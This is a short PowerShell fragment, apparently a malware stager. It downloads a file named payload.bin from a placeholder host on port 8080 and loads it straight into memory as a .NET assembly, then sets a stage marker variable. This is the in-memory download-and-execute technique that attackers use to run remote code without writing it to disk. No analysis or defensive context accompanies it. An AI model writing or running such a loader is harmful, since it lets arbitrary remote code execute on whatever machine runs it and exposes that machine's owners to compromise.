$ManagedBytes = (New-Object System.Net.WebClient).DownloadData("http://example.com:8080/payload.bin")
[Reflection.Assembly]::Load($ManagedBytes)
$StageMarker = "stage-11"
